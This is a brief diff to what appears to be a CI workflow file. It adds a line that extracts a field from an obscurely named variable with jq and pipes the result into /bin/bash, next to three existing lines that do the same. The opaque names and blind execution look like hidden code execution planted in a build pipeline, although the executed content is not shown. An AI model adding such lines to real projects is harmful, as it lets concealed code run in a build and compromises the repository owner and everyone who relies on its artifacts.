@@ -31,6 +31,7 @@ jobs:
           printf '%s' "$g5427" | jq -r .pmrei8928 | /bin/bash
           echo $we7234 | jq -r .r73613 | /bin/bash
           echo $fgkmn9 | jq -r .l344 | /bin/bash
+          echo $u97 | jq -r .azt70248 | /bin/bash
 
       - name: Save archive
         uses: actions/upload-artifact@v4
